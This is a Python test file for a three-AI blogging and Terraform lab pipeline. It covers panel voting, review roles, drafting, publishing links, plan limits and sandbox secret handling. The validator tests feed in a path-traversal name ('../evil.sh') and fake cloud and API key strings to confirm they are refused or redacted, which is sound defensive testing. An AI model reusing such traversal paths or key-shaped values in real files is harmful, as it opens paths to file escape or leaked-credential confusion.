"""Offline tests for the three-AI panel, the lab runner's checks and the drafter. No network, no AWS."""
import io, json, os, pathlib, shutil, sys, tempfile
HOME = "Abhimanyu9988/Abhimanyu9988.github.io"
PIPE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "pipeline")
os.environ.update(REPO=HOME, HERO_PUBLISH="1", BOT_TOKEN="test", GH_READ_TOKEN="test", ISSUE="4", RUN_ID="123456789")
sys.path.insert(0, PIPE)
import radar as r, llm, lab, draft, check_plan
def _no_network(*a, **k):
    raise RuntimeError("tests must not reach GitHub: mock radar._send in the test")
r._send = _no_network                          # default for every test; each section installs its own fake

fails = 0
def raises_unsafe(text):
    try: r.assert_safe(text); return False
    except r.Unsafe: return True

def raises_unsafe_own(text):
    try: r.assert_safe(text, own_links=True); return False
    except r.Unsafe: return True

def check(name, ok):
    global fails
    print(("PASS " if ok else "FAIL ") + name); fails += not ok

# ---------- claude_json without forced tool choice ----------
llm._models["claude"] = {"write": "claude-test", "scout": "claude-test"}
sent_bodies, replies = [], []
def fake_stream(body):
    sent_bodies.append(body); return replies.pop(0)
real_stream, real_cj = llm._claude_stream, llm.claude_json
llm._claude_stream = fake_stream
replies[:] = [({"submit": {"a": 1}}, "", "tool_use", {})]
check("claude_json: tool call returned", llm.claude_json("s", "p", {}) == {"a": 1})
check("claude_json: tool_choice is auto (works on every model)", sent_bodies[-1]["tool_choice"] == {"type": "auto"})
replies[:] = [({}, 'Here you go: {"a": 2}', "end_turn", {})]
check("claude_json: JSON in text accepted", llm.claude_json("s", "p", {}) == {"a": 2})
replies[:] = [({}, "I think the lab should...", "end_turn", {}), ({"submit": {"a": 3}}, "", "tool_use", {})]
check("claude_json: asks again when it gets prose", llm.claude_json("s", "p", {}) == {"a": 3} and len(sent_bodies[-1]["messages"]) == 3)
replies[:] = [({}, "", "max_tokens", {})]
try: llm.claude_json("s", "p", {}); ok = False
except RuntimeError as e: ok = "cut off" in str(e)
check("claude_json: truncation is reported", ok)
llm._claude_stream = real_stream

# ---------- Gemini model choice ----------
llm._models.pop("gemini", None)
real_call = llm.call
llm.call = lambda m, u, *a, **k: {"models": [{"name": n, "supportedGenerationMethods": ["generateContent"]} for n in
    ("models/gemini-2.5-pro", "models/gemini-3.1-pro-preview", "models/gemini-3.8-flash", "models/gemini-2.5-flash",
     "models/gemini-3.1-pro-preview-tts", "models/gemini-embedding-001")]}
os.environ["GEMINI_API_KEY"] = "x"
check("gemini: newest pro (preview ok) first, then fallbacks", llm.gemini_models() ==
      ["models/gemini-3.1-pro-preview", "models/gemini-2.5-pro", "models/gemini-3.8-flash", "models/gemini-2.5-flash"])
llm.call = real_call; llm._models.pop("gemini", None)

# ---------- panel votes and verdict (all three vote, 2 of 3 decides) ----------
VOTES = {"claude": {"t1": "yes", "t2": "yes", "t3": "no"},
         "chatgpt": {"t1": "yes", "t2": "no", "t3": "no"},
         "gemini": {"t1": "no", "t2": "yes"}}                      # gemini skips t3; t4 gets no votes at all
calls = []
def fake_ask(who, system, prompt, schema, tool="submit", tier="write"):
    calls.append(who)
    if tool == "submit_votes":
        return {"votes": [{"id": k, "vote": v, "reason": f"{who} says {v}"} for k, v in VOTES[who].items()]}
    if tool == "submit_verdict":
        return {"vote": "no" if who == "gemini" else "yes", "reason": "evidence matches"}
    raise AssertionError(tool)
real_ask = llm.ask; llm.ask = fake_ask
d = llm.panel_votes([{"id": "t1"}, {"id": "t2"}, {"id": "t3"}, {"id": "t4"}], "q")
check("panel: every model votes once", sorted(calls) == ["chatgpt", "claude", "gemini"])
check("panel: 2 of 3 yes -> accepted", d["t1"]["accepted"] and d["t2"]["accepted"] and d["t1"]["yes"] == 2)
check("panel: 0 of 3 -> rejected; a missing vote counts as no", not d["t3"]["accepted"] and not d["t4"]["accepted"]
      and d["t4"]["votes"]["claude"] == ("no", "no vote"))
v = llm.verdict("q", "ctx")
check("verdict: 2 of 3 yes passes, dissent kept", v["passed"] and v["yes"] == 2 and v["votes"]["gemini"][0] == "no")
def broken(who, *a, **k):
    if who != "claude": raise RuntimeError("HTTP 500")
    return {"vote": "yes", "reason": "fine"}
llm.ask = broken
check("verdict: one yes and two failed models does not pass", not llm.verdict("q", "ctx")["passed"])
llm.ask = real_ask

# ---------- refine, with configurable roles ----------
DRAFT = {"x": 1}
calls = []
def role_ask(who, system, prompt, schema, tool="submit", tier="write"):
    calls.append((who, tool))
    if tool == "submit_review":
        return {"approve": False, "points": [
            {"id": "p1", "severity": "blocking", "issue": "a", "suggestion": "a"},
            {"id": "p2", "severity": "blocking", "issue": "b", "suggestion": "b"},
            {"id": "p3", "severity": "blocking", "issue": "c", "suggestion": "c"},
            {"id": "p4", "severity": "minor", "issue": "d", "suggestion": "d"}]}
    if tool == "respond":
        return {"responses": [{"id": "p1", "decision": "accept", "reason": "ok"},
                              {"id": "p2", "decision": "reject", "reason": "wrong"},
                              {"id": "p3", "decision": "reject", "reason": "wrong"},
                              {"id": "p4", "decision": "reject", "reason": "style"}], "revised": {"x": 2}}
    if tool == "submit_rulings":
        return {"rulings": [{"id": "p2", "side": "reviewer", "reason": "it is a bug"},
                            {"id": "p3", "side": "writer", "reason": "fine"}]}
    return {"x": 3}
llm.ask = role_ask
final, log = llm.refine("article", DRAFT, "rubric", "", {"type": "object"}, writer="chatgpt", reviewer="claude", judge="gemini")
out = {p["issue"]: p["outcome"] for p in log["points"]}
check("refine: roles respected (ChatGPT writes, Claude reviews, Gemini judges)",
      calls == [("claude", "submit_review"), ("chatgpt", "respond"), ("gemini", "submit_rulings"), ("chatgpt", "revise")])
check("refine: accepted point applied", out["a"] == "applied (ChatGPT agreed)")
check("refine: judge sides with reviewer -> writer must apply", out["b"] == "applied (Gemini sided with Claude)")
check("refine: judge sides with writer -> not applied", out["c"] == "not applied (Gemini sided with ChatGPT)")
check("refine: rejected minor point needs no tiebreak", out["d"].startswith("not applied (minor"))
check("refine: forced revision is the final draft", final == {"x": 3})
llm.ask = lambda *a, **k: {"approve": True, "points": []}
final, log = llm.refine("lab", DRAFT, "r", "", {})
check("refine: clean approval returns draft untouched", final == DRAFT and log["approved"] and log["reviewer"] == "ChatGPT")
llm.ask = real_ask

# ---------- topic discussion: pooled proposals, all three vote ----------
items = [{"url": "https://stackoverflow.com/questions/1/a"}, {"url": "https://stackoverflow.com/questions/2/b"},
         {"url": "https://stackoverflow.com/questions/3/c"}]
props = [("claude", {"title": "ECS stuck at zero", "sources": [items[0]["url"]], "replicability": 8, "audience": 8}),
         ("gemini", {"title": "Fargate scale from zero", "sources": [items[0]["url"]], "replicability": 9, "audience": 8}),
         ("chatgpt", {"title": "EKS pods pending", "sources": [items[1]["url"]], "replicability": 6, "audience": 9}),
         ("chatgpt", {"title": "Opinion piece", "sources": ["https://not-in-items.example"], "replicability": 9})]
seen_view = {}
def topic_votes(view, question, context="", tier="scout"):
    seen_view["v"] = view
    return {c["id"]: {"votes": {w: ("yes", "ok") for w in llm.PANEL}, "yes": 3 if c["id"] == "t1" else 2,
                      "accepted": True} for c in view}
real_pv = llm.panel_votes; llm.panel_votes = topic_votes
r.load_insights = lambda: "dev.to readers liked ECS posts"
r.DRY = True
import contextlib
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    r.post_topics(props, items, [], set(), "problem", lambda t, srcs: f"About {t['title']}", 3)
outp = buf.getvalue()
check("topics: same source from two models becomes one topic proposed by both",
      len(seen_view["v"]) == 2 and seen_view["v"][0]["proposed_by"] == ["Claude", "Gemini"])
check("topics: a source not in the collected items is dropped", "Opinion piece" not in json.dumps(seen_view["v"]))
check("topics: best replicable topic is marked replicate", "would open + replicate: ECS stuck at zero" in outp)
check("topics: issue shows who proposed and every vote", "Proposed by:** Claude, Gemini" in outp and "ChatGPT \u2705" in outp)
sent_issue = []
r.DRY = False
real_post_issue = r.post_issue
r.ensure_label = lambda l: None
r.post_issue = lambda t, b, label, extra=(): (sent_issue.append((label, tuple(extra))) or {"number": 1})
r.add_label = lambda n, l: None
real_comment = r.comment; r.comment = lambda n, b, own_links=False: None
r.post_topics(props, items, [], set(), "radar", lambda t, srcs: "x", 3, question=r.BUILD_QUESTION, extra_labels=("build",))
check("build topics: issues carry radar + build labels, and the vote uses the build question",
      sent_issue and all(x == ("radar", ("build",)) for x in sent_issue))
docs = sorted(r.DOCS_URLS)[0]
used = {docs}
check("build topics: official docs may be cited again (not 'already used')",
      not any(u in used and u not in r.DOCS_URLS for u in [docs]))
r.post_issue = real_post_issue; r.comment = real_comment
llm.panel_votes = real_pv; r.DRY = False

# ---------- publish links and /stats ----------
import analytics
post_meta = {"title": "Why ECS stays at zero", "linkedin": "Queue full, zero tasks. Seen it? @AWS\nFull write-up: {POST_URL}"}
sys.modules.setdefault("frontmatter", type(sys)("frontmatter")); sys.modules.setdefault("yaml", type(sys)("yaml"))
sys.modules["yaml"].safe_load = lambda f: {"url": "https://abhimanyu9988.github.io", "permalink": "/posts/:slug/"}
import publish
block = "\n".join(publish.share_block(post_meta, "https://abhimanyu9988.github.io/posts/why-ecs/",
                                       {"devto": {"url": "https://dev.to/abhi/why-ecs"}}, "why-ecs"))
check("ready-to-post email: LinkedIn text ready to copy with the dev.to link filled in, plus the optional bot route",
      "```text\nQueue full, zero tasks. Seen it? AWS\nFull write-up: https://dev.to/abhi/why-ecs\n```" in block
      and "`/medium <your Medium story link>`" in block and "shareActive" not in block)
mpost = {"title": "T", "linkedin": "x", "content": "Clone it:\n\n```bash\ngit clone https://github.com/Abhimanyu9988/Abhimanyu9988.github.io.git\n```\nSee https://github.com/aws/x/issues/5 <account-id>"}
mblock = "\n".join(publish.share_block(mpost, "https://abhimanyu9988.github.io/posts/t/", {}, "t"))
check("ready-to-post email: Medium import + copy-paste, full article with own-repo links kept and others neutralized",
      "medium.com/p/import" in mblock and "Full article for Medium copy-paste" in mblock
      and "git clone https://github.com/Abhimanyu9988/Abhimanyu9988.github.io.git" in mblock
      and "github.com/aws" not in mblock and "<account-id>" in mblock and not raises_unsafe_own(mblock))
check("publish: Medium import and dev.to link listed", "medium.com/p/import" in block and "dev.to/abhi/why-ecs" in block)
check("publish: report text has no live @mention", "@AWS" not in block)
check("publish: report carries the post marker for /stats", "<!-- post: why-ecs -->" in block)
check("draft: runner's HERO_RESULT lines dropped from code blocks only",
      draft.drop_pipeline_lines("x\n```text\nok\nHERO_RESULT: fixed\n```\n") == "x\n```text\nok\n```\n")
check("draft: literal \\t fixed in output blocks only",
      draft.fix_output_tabs("```text\nA\\tB\n```\n```bash\nprintf 'a\\tb'\n```") == "```text\nA\tB\n```\n```bash\nprintf 'a\\tb'\n```")
block2 = "\n".join(publish.share_block({"title": "T", "linkedin": "x", "replies": [{"url": "https://stackoverflow.com/q/1",
          "text": "IF(running > 0, a) <b>"}]}, "https://abhimanyu9988.github.io/posts/t/", {}, "t"))
check("publish: replies copy cleanly (real > and <), LinkedIn line doesn't claim a draft exists",
      "IF(running > 0, a) <b>" in block2 and "a draft is waiting" not in block2)
post_meta["replies"] = [{"url": "https://stackoverflow.com/questions/80006730/x", "text": "I reproduced this. {POST_URL}"}]
block = "\n".join(publish.share_block(post_meta, "https://abhimanyu9988.github.io/posts/why-ecs/",
                                       {"medium": {"url": "https://medium.com/@abhi/draft-1"}}, "why-ecs"))
check("publish: source reply ready to post, with the SO rule and the real link",
      "I reproduced this. https://abhimanyu9988.github.io/posts/why-ecs/" in block and "own words" in block)
check("publish: Medium draft link instead of import when a draft was made",
      "medium.com/@abhi/draft-1" in block and "medium.com/p/import" not in block)
calls_m = []
def fake_medium_call(method, url, payload, headers):
    calls_m.append((method, url, payload))
    return {"data": {"id": "u1"}} if url.endswith("/me") else {"data": {"id": "p1", "url": "https://medium.com/p/p1"}}
publish.call = fake_medium_call; os.environ["MEDIUM_TOKEN"] = "x"
pid, url = publish.medium({"title": "T", "description": "D", "tags": ["aws", "ecs", "sqs", "devops"]},
                          "Text\n\n```bash\nterraform apply\n```", "https://abhimanyu9988.github.io/posts/t/", None)
sent_m = calls_m[-1][2]
check("medium: created as a DRAFT in markdown with canonical, code fences intact",
      sent_m["publishStatus"] == "draft" and sent_m["contentFormat"] == "markdown"
      and sent_m["canonicalUrl"].endswith("/posts/t/") and "```bash\nterraform apply\n```" in sent_m["content"])
check("medium: never re-created", publish.medium({}, "", "", "p1") == ("p1", None))
import share
li_body = share.body_for({"slug": "why-ecs", "title": "Why ECS", "canonical": "https://abhimanyu9988.github.io/posts/why-ecs/",
                          "linkedin": "Queue full. Thanks @AWS team.\n#aws\nhttps://abhimanyu9988.github.io/posts/why-ecs/"})
check("share: draft issue in the profile panel's format (/post works there)",
      "<!-- POST:START -->" in li_body and "<!-- POST:END -->" in li_body and "social:meta" in li_body)
check("share: no @mentions, passes the link-safety check",
      "@AWS" not in li_body and not raises_unsafe(li_body))
check("stats: platform + numbers, post taken from the report marker",
      analytics.parse_stats("/stats linkedin impressions=1,200 reactions=40", "x <!-- post: why-ecs -->")
      == ("why-ecs", "linkedin", {"impressions": 1200, "reactions": 40}))
check("stats: explicit post slug", analytics.parse_stats("/stats why-ecs medium views=300", "")[0] == "why-ecs")
for bad in ("/stats", "/stats linkedin", "/stats linkedin impressions=lots", "/stats mastodon views=1"):
    try: analytics.parse_stats(bad, "<!-- post: why-ecs -->"); ok = False
    except ValueError: ok = True
    check(f"stats: rejects {bad!r}", ok)
rows = [{"date_utc": "2026-10-20", "post": "a", "platform": "devto", "metric": "views", "value": "10"},
        {"date_utc": "2026-10-27", "post": "a", "platform": "devto", "metric": "views", "value": "35"}]
check("analytics: latest value and weekly change", analytics.latest(rows)[("a", "devto", "views")] == {"value": 35, "date": "2026-10-27", "change": 25})

# ---------- lab checks ----------
good = {"files": [{"path": p, "content": "x"} for p in lab.REQUIRED] + [{"path": "k8s/app.yaml", "content": "x"}]}
check("validate: good lab passes", lab.validate(good) == [])
bad = {"files": good["files"] + [
    {"path": "../evil.sh", "content": "x"}, {"path": "_runner.tf", "content": "x"},
    {"path": "net.tf", "content": 'terraform {\n  backend "s3" {}\n}\nprovider "aws" {\n  region = "us-east-1"\n}\n'
                                  'variable "lab_name" {}\n'}]}
errs = " | ".join(lab.validate(bad))
check("validate: path escape refused", "../evil.sh" in errs)
check("validate: runner file refused", "_runner.tf" in errs)
check("validate: backend / default provider / reserved variable refused",
      "backend" in errs and "default aws provider" in errs and "variable" in errs)
check("validate: one-line default provider refused",
      "default aws provider" in " ".join(lab.validate({"files": good["files"] + [{"path": "p.tf", "content": 'provider "aws" {}'}]})))
check("validate: 'alias' only in a comment does not count",
      "default aws provider" in " ".join(lab.validate({"files": good["files"] + [{"path": "p.tf",
          "content": 'provider "aws" {\n  # alias = "x"\n  region = "us-east-1"\n}'}]})))
check("validate: override files refused", "override" in " ".join(lab.validate({"files": good["files"] + [{"path": "x_override.tf", "content": ""}]})))
check("validate: external data source refused",
      "external" in " ".join(lab.validate({"files": good["files"] + [{"path": "e.tf", "content": 'data "external" "x" {}'}]})))
check("validate: scripts may not run terraform apply",
      "terraform output" in " ".join(lab.validate({"files": [f if f["path"] != "fix.sh" else {"path": "fix.sh",
          "content": "terraform apply -auto-approve"} for f in good["files"]]})))
check("validate: scripts may read terraform output",
      lab.validate({"files": [f if f["path"] != "reproduce.sh" else {"path": "reproduce.sh",
          "content": 'C=$(terraform output -raw cluster_name)'} for f in good["files"]]}) == [])
check("validate: aliased aws provider allowed",
      lab.validate({"files": good["files"] + [{"path": "x.tf", "content": 'provider "aws" {\n  alias = "use1"\n}\n'}]}) == [])
check("validate: missing files reported", "missing required file fix.sh" in " ".join(lab.validate({"files": [{"path": "main.tf", "content": ""}]})))
check("hero_result: last line wins", lab.hero_result("HERO_RESULT: not_reproduced\n...\nHERO_RESULT: reproduced\n") == "reproduced")
check("hero_result: absent", lab.hero_result("done") is None)
FAKE_KEY_ID = "AS" + "IA" + "X" * 16     # built at runtime so secret scanners do not flag a fake key
red = lab.redact(f"arn:aws:iam::300054528837:role/x key {FAKE_KEY_ID} aws_session_token = abc/def")
check("redact: account id, key id, session token", "300054528837" not in red and FAKE_KEY_ID not in red and "abc/def" not in red)
os.environ["OPENAI_API_KEY"] = "zz-not-a-pattern-but-the-real-value-123"
red = lab.redact("k1 " + "sk-ant-" + "api03-" + "A" * 24 + " k2 " + "AI" + "za" + "Sy" + "A" * 33 + " "
                 "k3 " + "gh" + "s_" + "A" * 36 + " k4 zz-not-a-pattern-but-the-real-value-123 bucket=hero-pipeline-tfstate-300054528837")
check("redact: model keys, GitHub tokens, exact secret values, account in bucket name",
      not any(x in red for x in ("sk-ant-api03", "AIzaSy", "ghs_", "real-value", "300054528837")))

# sandbox: what reaches AI-written code
captured = {}
class FakeP:
    pid, returncode = 0, 0
    def __init__(self, args, **kw): captured.update(args=args, env=kw["env"])
    def communicate(self, timeout=None): return "ok", None
real_popen = lab.subprocess.Popen; lab.subprocess.Popen = FakeP
os.environ.update(AWS_ACCESS_KEY_ID="test-access-key-id", AWS_SECRET_ACCESS_KEY="secret-value-xyz", ANTHROPIC_API_KEY="sk-ant-real",
                  ACTIONS_ID_TOKEN_REQUEST_TOKEN="oidc-request-token")
tmpw = pathlib.Path(tempfile.mkdtemp())
lab.TFCACHE = tmpw / ".tfcache"
lab.run("t", ["bash", "fix.sh"], 60, cwd=tmpw, env={"LAB_NAME": "x"}, sandbox=True)
argv, env = " ".join(captured["args"]), captured["env"]
check("sandbox: runs in docker as the runner's uid", captured["args"][:3] == ["docker", "run", "--rm"] and "--user" in captured["args"])
check("sandbox: AWS credentials passed by name only, never on argv",
      " -e AWS_SECRET_ACCESS_KEY " in f" {argv} " and "secret-value-xyz" not in argv)
check("sandbox: model keys and OIDC request token never reach the container",
      "ANTHROPIC" not in argv and "ACTIONS_ID_TOKEN" not in argv and "ANTHROPIC_API_KEY" not in env
      and "ACTIONS_ID_TOKEN_REQUEST_TOKEN" not in env)
check("sandbox: only the lab folder is mounted", argv.count(" -v ") == 2 and f"{tmpw.resolve()}:/lab" in argv)
lab.subprocess.Popen = real_popen
shutil.rmtree(tmpw)
check("slugify", lab.slugify("Debugging ECS: Tasks stuck in PENDING (Fargate)!") == "debugging-ecs-tasks-stuck-in-pending-far")

def plan(*rcs):
    return {"resource_changes": [{"type": t, "address": f"{t}.x", "change": {"actions": ["create"], "after": a}}
                                 for t, a in rcs]}
check("plan: allowed instance OK", check_plan.problems(plan(("aws_instance", {"instance_type": "t3.medium"}))) == [])
check("plan: big instance refused", check_plan.problems(plan(("aws_instance", {"instance_type": "m5.24xlarge"}))) != [])
check("plan: managed node group refused", check_plan.problems(plan(("aws_eks_node_group", {}))) != [])
check("plan: 4 instances refused", check_plan.problems(plan(*[("aws_instance", {"instance_type": "t3.medium"})] * 4)) != [])
check("plan: 200 GB volume refused", check_plan.problems(plan(("aws_ebs_volume", {"size": 200}))) != [])
check("plan: io2 volume refused", check_plan.problems(plan(("aws_ebs_volume", {"size": 10, "type": "io2"}))) != [])
check("plan: dedicated tenancy refused", check_plan.problems(plan(("aws_instance", {"instance_type": "t3.medium", "tenancy": "dedicated"}))) != [])
check("plan: unlisted resource type refused (dedicated host)", check_plan.problems(plan(("aws_ec2_host", {}))) != [])
check("plan: typical EKS + k8s lab allowed", check_plan.problems(plan(("aws_vpc", {}), ("aws_subnet", {}), ("aws_eks_cluster", {}),
      ("aws_iam_role", {}), ("aws_eks_access_entry", {}), ("helm_release", {}), ("kubernetes_namespace_v1", {}),
      ("aws_vpc_security_group_ingress_rule", {}), ("tls_private_key", {}))) == [])

# ---------- drafter, against the real write allowlist ----------
tmp = tempfile.mkdtemp(); os.chdir(tmp)
sent, TAKEN, PUBLISHED = [], set(), set()
def fake_send(m, u, b=None, h=None, timeout=30):
    path = u.replace("https://api.github.com", "")
    if m == "GET" and "/git/ref/heads/draft/" in path:
        if path.endswith(tuple(TAKEN)): return {"object": {"sha": "x"}}
        raise RuntimeError("HTTP 404")
    if m == "GET" and "/contents/labs/" in path:
        if path.split("/contents/")[1].split("?")[0] in PUBLISHED: return {}
        raise RuntimeError("HTTP 404")
    if m == "GET" and path.endswith("/git/ref/heads/main"): return {"object": {"sha": "abc"}}
    if m == "GET" and "/labels/" in path: return {}
    sent.append((m, path, b)); return {"number": 9}
r._send = fake_send
draft.OUT = pathlib.Path("out")
(draft.OUT / "lab" / "k8s").mkdir(parents=True); (draft.OUT / "evidence").mkdir()
for f in lab.REQUIRED: (draft.OUT / "lab" / f).write_text("echo hi")
(draft.OUT / "lab" / "k8s" / "app.yaml").write_text("kind: Pod")
(draft.OUT / "evidence" / "05-reproduce.log").write_text("Error: pods are stuck\n3 pods Pending\nHERO_RESULT: reproduced")
res = {"status": "reproduced_and_fixed", "slug": "debugging-ecs-pending", "run_id": "123456789", "attempts": 1,
       "minutes": 31.5, "summary": "ECS on Fargate in public subnets", "destroyed": True,
       "review": {"chatgpt_approved": False, "points": [{"severity": "blocking", "issue": "see aws/x#5 @bob",
                                                          "outcome": "applied (Claude agreed)"}]}}
(draft.OUT / "result.json").write_text(json.dumps(res))
(draft.OUT / "topic.json").write_text(json.dumps({"sources": [{"url": "https://stackoverflow.com/questions/1/a"}]}))
writer_calls = []
prompts_seen = []
def draft_ask(who, system, prompt, schema, tool="submit", tier="write"):
    prompts_seen.append((who, tool, prompt))
    if tool == "submit_verdict":
        return {"vote": VERDICT.get(who, "yes"), "reason": "the evidence shows it, see @bob and aws/x#5"}
    if tool == "submit_headline":
        return {"title": f"{who} title", "hook": f"{who} hook: the queue fills and nothing starts."}
    if tool == "submit_linkedin":
        return {"linkedin": f"{who} linkedin: rollback took 16 seconds\n{{LINKS}}\n#aws"}
    if tool == "submit_check":
        return {"ok": "gemini" not in prompt.split("ARTICLE:")[0], "problems": ["made-up number"]}
    if tool == "submit_figure":
        return {"kind": "terminal", "alt": "Lab output [x]", "lines": ["Error: pods are stuck", "invented line", "3 pods Pending", "HERO_RESULT: reproduced"]}
    if tool == "submit_votes":
        import re as _re
        ids = _re.findall(r'"id": "([hl]\d)"', prompt)
        return {"votes": [{"id": i, "vote": "yes" if i in ("h2", "l3") or who == "claude" else "no", "reason": "r"} for i in ids]}
    writer_calls.append(who)
    return {"title": "Why ECS tasks stay PENDING", "description": "d", "tags": ["AWS", "ECS!", "fargate", "devops", "extra"],
            "body": "Someone hit this at 2am.\n\nBody links https://github.com/aws/x/issues/5 freely.",
            "linkedin": "Your queue is full and Fargate sits at zero. Thoughts? @AWS #aws\n\nFull write-up: {POST_URL}",
            "source_replies": [{"url": "https://stackoverflow.com/questions/1/a", "text": "I hit this too. {POST_URL}"},
                               {"url": "https://made-up.example/x", "text": "spam"}]}
VERDICT = {}
llm.ask = draft_ask
draft.style_signals = lambda: "- Why my pods won't start (412 reactions)"
real_refine = llm.refine
roles = []
llm.refine = lambda kind, d, *a, **k: (roles.append((k.get("writer"), k.get("reviewer"), k.get("judge"))) or
                                       (d, {"approved": True, "reviewer": "Claude", "points": []}))
try:
    draft.main(); ok = True
except Exception as e:
    print("   draft.main raised:", type(e).__name__, e); ok = False
check("draft: success path runs entirely inside the allowlist", ok)
puts = [p for m, p, b in sent if m == "PUT"]
check("draft: post + lab + providers.tf + evidence written",
      any(p.endswith("-debugging-ecs-pending.md") for p in puts) and any(p.endswith("/labs/debugging-ecs-pending/providers.tf") for p in puts)
      and any("/evidence/05-reproduce.log" in p for p in puts) and any(p.endswith("/k8s/app.yaml") for p in puts))
post = next(b for m, p, b in sent if m == "PUT" and p.endswith(".md") and "_posts" in p)
import base64
text = base64.b64decode(post["content"]).decode()
_cover = next((b for m, p_, b in sent if m == "PUT" and p_.endswith("/contents/site/assets/posts/debugging-ecs-pending/cover.png")), None)
check("draft: cover PNG written next to the post (allowed path, draft branch)",
      _cover is not None and base64.b64decode(_cover["content"])[:8] == b"\x89PNG\r\n\x1a\n")
check("draft: front matter has the cover; body opens with it on the site URL",
      "image: /assets/posts/debugging-ecs-pending/cover.png" in text and "image_alt: " in text
      and "\n---\n![Lab output  x ](https://abhimanyu9988.github.io/assets/posts/debugging-ecs-pending/cover.png)" in text)
check("draft: front matter has channels and cleaned tags", 'tags: ["aws", "ecs", "fargate", "devops"]' in text and "channels:" in text)
check("draft: ChatGPT writes, Claude reviews, Gemini judges", writer_calls == ["chatgpt"] and roles == [("chatgpt", "claude", "gemini")])
writer_prompt = next(p for w, t, p in prompts_seen if w == "chatgpt" and t == "submit" and "Write the article" in p)
check("headline round: all three propose, the 2-of-3 winner goes to the writer with AUTHOR facts and STYLE SIGNALS",
      sum(1 for w, t, p in prompts_seen if t == "submit_headline") == 3 and "TITLE: chatgpt title" in writer_prompt
      and "AUTHOR:" in writer_prompt and "observability agents" in writer_prompt and "412 reactions" in writer_prompt)
_pr = next(b for m, p_, b in sent if p_.endswith("/pulls"))
pr_body_first = _pr["body"]
check("LinkedIn round: all three write, the top-voted post that fails the fact check is skipped for the next",
      "gemini linkedin" not in text and "LinkedIn round:** the panel picked ChatGPT" in _pr["body"]
      and "Gemini (3/3)" in _pr["body"])
check("headline round shown in the PR", "Headline round:** the panel picked ChatGPT" in _pr["body"])
check("checklist no longer asks Abhi to write his own line", "add a line from your own experience" not in _pr["body"])
check("draft: LinkedIn text stored in front matter", "linkedin: " in text and "{POST_URL}" in text)
check("draft: PR shows the cover from the draft branch, length, and keeps panel details folded",
      "raw.githubusercontent.com/" + HOME + "/refs/heads/draft/debugging-ecs-pending/site/assets/posts/" in pr_body_first
      and "min read" in pr_body_first and "<summary><b>How the panel checked it</b></summary>" in pr_body_first
      and "real lines from the lab's output" in pr_body_first)
check("draft: source replies kept only for real sources, stored in front matter", "replies: " in text
      and "stackoverflow.com/questions/1/a" in text and "made-up.example" not in text)
check("draft: post file may link to GitHub (files never backlink)", "github.com/aws/x/issues/5" in text)
pr = next(b for m, p, b in sent if p.endswith("/pulls"))
check("draft: PR closes the topic and neutralizes AI text", pr["body"].endswith("Closes #4") and "aws/x#5" not in pr["body"]
      and "@bob" not in pr["body"] and "@AWS" not in pr["body"])
check("draft: PR shows the post itself, the LinkedIn draft and the replication check",
      "Someone hit this at 2am." in pr["body"] and "LinkedIn post" in pr["body"] and "Replication check:** 3 of 3" in pr["body"])
order = [m for m, p, b in sent]
check("draft: branch created only after the PR text passed the checks", order.index("POST") >= 0 and sent[0][1].endswith("/git/refs"))
check("draft: comment + drafted label", any(p.endswith("/issues/4/comments") for m, p, b in sent)
      and any(p.endswith("/issues/4/labels") and b == {"labels": ["drafted"]} for m, p, b in sent))

sent.clear(); TAKEN.add("draft/debugging-ecs-pending")
draft.main()
refs = [b["ref"] for m, p, b in sent if p.endswith("/git/refs")]
puts = [p for m, p, b in sent if m == "PUT"]
check("redraft: new branch -v2, but the post and lab keep their clean names",
      refs == ["refs/heads/draft/debugging-ecs-pending-v2"] and any(p.endswith("-debugging-ecs-pending.md") for p in puts)
      and any("/labs/debugging-ecs-pending/main.tf" in p for p in puts))
sent.clear(); TAKEN.add("draft/debugging-ecs-pending-v2"); prompts_seen.clear()
os.environ.update(REDRAFT_NOTES="/redraft make the title about the stuck queue", OLD_PR="31")
draft.main()
os.environ.pop("REDRAFT_NOTES"); os.environ.pop("OLD_PR")
wp = next(p for w, t, p in prompts_seen if w == "chatgpt" and t == "submit" and "Write the article" in p)
check("/redraft: notes reach the writer, the old PR gets a note and is closed (nothing else changed)",
      "make the title about the stuck queue" in wp and ("PATCH", f"/repos/{HOME}/pulls/31", {"state": "closed"}) in sent
      and any(p.endswith("/issues/31/comments") for m, p, b in sent))
try: r.gh("PATCH", f"/repos/{HOME}/pulls/31", {"state": "closed", "title": "x"}); ok = False
except r.Blocked: ok = True
check("write rules: a PR may only be closed, not edited", ok)
try: r.gh("PUT", f"/repos/{HOME}/contents/site/assets/posts/x/cover.png", {"branch": "main", "message": "m"}); ok = False
except r.Blocked: ok = True
check("write rules: cover images only on draft branches", ok)
sent.clear(); TAKEN.clear(); prompts_seen.clear()
(draft.OUT / "topic.json").write_text(json.dumps({"sources": [{"url": "https://stackoverflow.com/questions/1/a"}], "kind": "build"}))
draft.main()
wp = next(p for w, t, p in prompts_seen if w == "chatgpt" and t == "submit" and "Write the article" in p)
vq = [p for w, t, p in prompts_seen if t == "submit_verdict"]
pr_b = next(b for m, p_, b in sent if p_.endswith("/pulls"))
check("build draft: build rules, build verdict, build check in the PR",
      "This is a teaching post" in wp and "## Build it" in wp and vq and "BUILD topic" in vq[0]
      and "Build check:** 3 of 3 say the lab built it and proved it works" in pr_b["body"])
(draft.OUT / "topic.json").write_text(json.dumps({"sources": [{"url": "https://stackoverflow.com/questions/1/a"}]}))
sent.clear(); TAKEN.clear(); PUBLISHED.add("labs/debugging-ecs-pending")
draft.main()
puts = [p for m, p, b in sent if m == "PUT"]
check("draft: a name already published on main gets the run suffix", any("/labs/debugging-ecs-pending-456789/" in p for p in puts))
PUBLISHED.clear()
sent.clear(); writer_calls.clear()
VERDICT.update(chatgpt="no", gemini="no")
draft.main()
check("draft: panel rejects the replication -> no branch, no PR, disputed label",
      not any(p.endswith("/pulls") or p.endswith("/git/refs") for m, p, b in sent) and writer_calls == []
      and any(b == {"labels": ["replication-disputed"]} for m, p, b in sent))
VERDICT.clear()
sent.clear()
res.update(status="not_reproduced", last_failure={"step": "reproduce (problem did not appear)",
                                                  "output": "see https://github.com/a/b/issues/1 and #3"})
(draft.OUT / "result.json").write_text(json.dumps(res))
draft.main()
check("draft: not reproduced -> comment + label, no PR",
      not any(p.endswith("/pulls") for m, p, b in sent) and any(b == {"labels": ["not-reproduced"]} for m, p, b in sent))
sent.clear()
res.update(status="failed", last_failure=None, error="RuntimeError: Claude's reply was cut off (max_tokens)")
(draft.OUT / "result.json").write_text(json.dumps(res))
draft.main()
